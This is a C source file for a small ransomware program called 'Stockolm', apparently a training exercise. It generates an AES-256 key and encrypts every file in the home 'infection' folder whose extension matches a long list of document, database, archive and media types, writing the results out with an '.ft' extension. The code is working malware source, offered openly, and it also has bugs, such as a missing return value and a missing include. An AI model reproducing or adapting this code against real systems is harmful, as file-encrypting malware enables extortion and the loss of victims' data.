#include <unistd.h>
#include <stdio.h>
#include <ctype.h>
#include <stdlib.h>
#include <pwd.h>
#include <limits.h>
#include <string.h>
#include <bsd/string.h>
#include <sys/stat.h>
#include <dirent.h>
#include <openssl/rand.h>

#define VERSION	"Stockolm, version 1.0"
#define	FOLDER	"infection"
#define EXTENSION ".123 .3dm .3ds .3g2 .3gp .602 .7z .accdb .aes .ai .ARC .asc .asf .asm .asp .avi .backup .bak .bat .bmp .brd .bz2 .c .cgm .class .cmd .cpp .crt .cs .csr .csv .db .dbf .dch .der .dif .dip .djvu .doc .docb .docm .docx .dot .dotm .dotx .dwg .edb .eml .fla .flv .frm .gif .gpg .gz .h .hwp .ibd .iso .jar .java .jpeg .jpg .js .jsp .key .lay .lay6 .ldf .m3u .m4u .max .mdb .mdf .mid .mkv .mml .mov .mp3 .mp4 .mpeg .mpg .msg .myd .myi .nef .odb .odg .odp .ods .odt .onetoc2 .ost .otg .otp .ots .ott .p12 .PAQ .pas .pdf .pem .pfx .php .pl .png .pot .potm .potx .ppam .pps .ppsm .ppsx .ppt .pptm .pptx .ps1 .psd .pst .rar .raw .rb .rtf .sch .sh .sldm .sldm .sldx .slk .sln .snt .sql .sqlite3 .sqlitedb .stc .std .sti .stw .suo .svg .swf .sxc .sxd .sxi .sxm .sxw .tar .tbk .tgz .tif .tiff .txt .uop .uot .vb .vbs .vcd .vdi .vmdk .vmx .vob .vsd .vsdx .wav .wb2 .wk1 .wks .wma .wmv .xlc .xlm .xls .xlsb .xlsm .xlsx .xlt .xltm .xltx .xlw .zip "
#define NB_EXT		179
#define	KEY_SIZE	32
#define PATH_MAX	4096

// extern int errno;

int	good_extension(char *file_name)
{
	char *p = strrchr(file_name, '.');
	char	file_ext[16];
	int i = 0;
	int	e = 0;

	if (!p)
		return (0);
	while (*p != '\0')
	{
		if (i == 15)
			return (0);
		file_ext[i] = *p;
		if (file_ext[i] == ' ')
			return (0);
		p++;
		i++;
 	}
	file_ext[i] = '\0';
	// printf("extension of %s is %s|\n", file_name, file_ext);
	while (EXTENSION[e] != '\0')
	{
		i = 0;
		while (file_ext[i] && EXTENSION[e])
		{
			if (file_ext[i] != EXTENSION[e])
				break ;
			if (EXTENSION[e] == ' ')
			{
				i++;
				break ;
			}
			i++;
			e++;
		}
		if (file_ext[i] == '\0' && EXTENSION[e] == ' ')
			return (1);
		while (EXTENSION[e] != ' ')
			e++;
		e++;
	}
	return (0);
}

int	create_key(char *new_key, int silence)
{
	if (!RAND_bytes(new_key, KEY_SIZE))
	{
		fprintf(stderr, "Error: generating key\n");
		return (-1);
	}
	printf("\nKey created:\n", new_key);
	write(1, new_key, KEY_SIZE);
	write(1, "\n", 1);
	return (0);

}

char	*get_home()
{
	char *home_dir = NULL;

	home_dir = getenv("HOME");
	printf("get_env >> %s \n", home_dir);
	if (!home_dir)
	{
		struct passwd *pw = getpwuid(getuid());
		if (!pw)
			return (NULL);
		home_dir = pw->pw_dir;
	}
	return (home_dir);
}

int is_dir_exists(const char *path) {
    struct stat st;

    if (stat(path, &st) == -1) {
        return -1; // Le dossier n
    }
	if (S_ISDIR(st.st_mode))
    	return (0); // Vérifie que c'est bien un dossier
	return (-1);
}

int	file_cryptage(char *path_file, char *key)
{
	unsigned char	iv[16]; // 128 bits (taille standart pour AES)

	//indispensable pour avoir des fichier cripter differament (a stocker dans le fichier)
	if (!RAND_bytes(iv, sizeof(iv)))
		return(fprintf(stderr, "Error: generating iv\n"), 0);

		
	FILE	*input = fopen(path_file, "rb");
	if (!input)
		return (fprintf(stderr, "Error: fopen input\n"), 0);

	if (strlcat(path_file, ".ft", PATH_MAX) > PATH_MAX)
		return (fprintf(stderr, "Error: path of the new file name is to long\n"), 0);

	FILE	*output = fopen(path_file, "wb");
	if (!output)
	{	
		fclose(input);
		return (fprintf(stderr, "Error: fopen output\n"), 0);
	}

	EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
	EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv);

	unsigned char	in_buf[4096];
	unsigned char	out_buf[4096 + EVP_MAX_BLOCK_LENGTH];
	int				bytes_read, out_len;

	fwrite(iv, 1, sizeof(iv), output);

	while ((bytes_read = fread(in_buf, 1, sizeof(in_buf), input)) > 0)
	{
		EVP_EncryptUpdate(ctx, out_buf, &out_len, in_buf, bytes_read);
    	fwrite(out_buf, 1, out_len, output);
	}

	EVP_EncryptFinal_ex(ctx, out_buf, &out_len);
    fwrite(out_buf, 1, out_len, output);

    // 7. Nettoyage
    EVP_CIPHER_CTX_free(ctx);
    fclose(input);
    fclose(output);
}

int	folder_cryptage(char *path_to_folder, char *key, int silence)
{
	DIR	*rep = opendir(path_to_folder);
	struct dirent	*ent = NULL;
	char			file_path[PATH_MAX];
	size_t			size;

	
	if (rep != NULL)
	{
		strncpy(file_path, path_to_folder, PATH_MAX);
		strlcat(file_path, "/", PATH_MAX);
		size = strlen(file_path);
		if (!silence)
			printf("\nOpen directorie %s\n\n", file_path);
		while ((ent = readdir(rep)) != NULL)
		{
			if (good_extension(ent->d_name))
			{
				file_path[size] = '\0';
				if (strlcat(file_path, ent->d_name, PATH_MAX) > PATH_MAX)
					fprintf(stderr, "Error: path of file to long: %s", file_path);
				if (!silence)
					printf("cryptage de %s\n", file_path);
				file_cryptage(file_path, key);
			}
		}
	}
	else
	{
		fprintf(stderr, "Cannot open folder %s\n", path_to_folder);
		return (0);
	}
	free(rep);
	return (1);

}

int	main(int argc, char *argv[])
{
	int		opt;
	char	*key = NULL;
	int		silent_mode = 0;

	// errno = 0;

	while ((opt = getopt(argc, argv, "hvr:s")) != -1)
	{
		switch (opt)
		{
			case 'h':
				printf("Usage: %s [-h] [-v] [-r KEY] [-s]\n", argv[0]); // faire une meilleur doc
				break ;
			case 's':
				silent_mode = 1;
				break ;
			case 'v':
				printf("%s\n", VERSION);
				break ;
			case 'r':
				key = optarg;
				break ;
			case '?':
				if (optopt == 'r')
					fprintf(stderr, "Option -%c requires an argument.\n", optopt);
				else if (isprint (optopt))
					fprintf (stderr, "Unknown option `-%c'.\n", optopt);
        		else
          			fprintf (stderr, "Unknown option character `\\x%x'.\n", optopt);
				return (1);
			default:
				fprintf(stderr, "Invalid option\n");
				return (1); 
		}
	}
	// printf("s= %d , r = %s, EXTENSION %s \n", silent_mode, key, EXTENSION);
	char path_to_folder[PATH_MAX];
	char *path_home = get_home();
	if (!path_home)
		return (fprintf(stderr, "Error: Cannot find home directorie\n"), 1);
	if (snprintf(path_to_folder, sizeof(path_to_folder), "%s/%s", path_home, FOLDER) == -1)
		return (fprintf(stderr, "Error: concatenation path\n"), 1);
	if (is_dir_exists(path_to_folder) == -1)
		return (fprintf(stderr, "Error: cannot access folder %s\n", path_to_folder), 1);
	if (access(path_to_folder, R_OK | W_OK | X_OK) == -1)
	    return (fprintf(stderr, "Error: Pas les permissions sur '%s'.\n", path_to_folder), 1);
	
	if (key == NULL)
	{
		char new_key[32];
		if (create_key(new_key, silent_mode) == -1)
			return (1);
		
		if (folder_cryptage(path_to_folder, new_key, silent_mode))
			return (1);
	}
	// else
	// {
	// 	if (folder_decryptage(path_to_folder, key, silent_mode))
	// 		return (1);
	// }


	return (0);

}